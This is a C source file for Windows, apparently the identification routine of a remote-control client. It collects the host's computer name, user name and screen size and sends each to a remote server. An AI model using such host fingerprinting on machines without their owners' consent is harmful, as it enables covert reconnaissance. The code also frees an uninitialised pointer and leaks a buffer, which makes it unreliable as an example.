#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <dirent.h>
#include "types.h"
#include "net/interface.h"
#include "net/commands.h"

int net_cmd_Indentify(char* msg, int msgLen)
{
	int tries = 0;
	int buffLen = 1024;
	char _rval[buffLen];
	char* rval = malloc(buffLen + 2 + sizeof(char));
	char *rmsg;
	memset(rval, 0, buffLen + 3);
	
	NET_TRYING_SLEEP();

	if(!GetComputerName(_rval, &buffLen))
	{
		if(net_SendData(NULL, "-C", 2) < 1)
		{
			free(rmsg);

			return -1;
		}
	}else{
		*rval = '+';
		*rval++;
		*rval = 'C';
		*rval++;
		strncpy(rval, _rval, buffLen);
		*rval--;
		*rval--;

		if(net_SendData(NULL, rval, buffLen + 2) < 1)
		{
			free(rmsg);

			return -1;
		}

		while(1)
		{
			if(net_ReciveData(NULL, &rmsg) < 1)
			{
				if(tries == NET_PROTECT_CPU_TRIES)
				{
					free(rmsg);

					return -1;
				}

				tries++;
				NET_TRYING_SLEEP();
			}else{
				tries = 0;
				break;
			}
		}
	}

	NET_TRYING_SLEEP();
	memset(rval, 0, buffLen + 3);
	memset(_rval, 0, 1024);
	buffLen = 1024;
	if(!GetUserName(_rval, &buffLen))
	{
		if(net_SendData(NULL, "-U", 2) < 1)
		{
			free(rmsg);

			return -1;
		}
	}else{
		*rval = '+';
		*rval++;
		*rval = 'U';
		*rval++;
		strncpy(rval, _rval, buffLen);
		*rval--;
		*rval--;

		if(net_SendData(NULL, rval, buffLen + 2) < 1)
		{
			free(rmsg);

			return -1;
		}

		while(1)
		{
			if(net_ReciveData(NULL, &rmsg) < 1)
			{
				if(tries == NET_PROTECT_CPU_TRIES)
				{
					free(rmsg);

					return -1;
				}

				tries++;
				NET_TRYING_SLEEP();
			}else{
				tries = 0;
				break;
			}
		}
	}

	NET_TRYING_SLEEP();
	memset(rval, 0, buffLen + 3);
	memset(_rval, 0, 1024);
	buffLen = 1024;
	if(!itoa(GetSystemMetrics(SM_CXVIRTUALSCREEN), &_rval, 10))
	{
		if(net_SendData(NULL, "-X", 2) < 1)
		{
			free(rmsg);

			return -1;
		}
	}else{
		*rval = '+';
		*rval++;
		*rval = 'X';
		*rval++;
		strncpy(rval, _rval, buffLen);
		*rval--;
		*rval--;

		if(net_SendData(NULL, rval, buffLen + 2) < 1)
		{
			free(rmsg);

			return -1;
		}

		while(1)
		{
			if(net_ReciveData(NULL, &rmsg) < 1)
			{
				if(tries == NET_PROTECT_CPU_TRIES)
				{
					free(rmsg);

					return -1;
				}

				tries++;
				NET_TRYING_SLEEP();
			}else{
				tries = 0;
				break;
			}
		}
	}

	NET_TRYING_SLEEP();
	memset(rval, 0, buffLen + 3);
	memset(_rval, 0, 1024);
	buffLen = 1024;
	if(!itoa(GetSystemMetrics(SM_CYVIRTUALSCREEN), &_rval, 10))
	{
		if(net_SendData(NULL, "-Y", 2) < 1)
		{
			free(rmsg);

			return -1;
		}
	}else{
		*rval = '+';
		*rval++;
		*rval = 'Y';
		*rval++;
		strncpy(rval, _rval, buffLen);
		*rval--;
		*rval--;

		if(net_SendData(NULL, rval, buffLen + 2) < 1)
		{
			free(rmsg);

			return -1;
		}

		while(1)
		{
			if(net_ReciveData(NULL, &rmsg) < 1)
			{
				if(tries == NET_PROTECT_CPU_TRIES)
				{
					free(rmsg);

					return -1;
				}

				tries++;
				NET_TRYING_SLEEP();
			}else{
				tries = 0;
				break;
			}
		}
	}

	free(rmsg);

	return 1;
}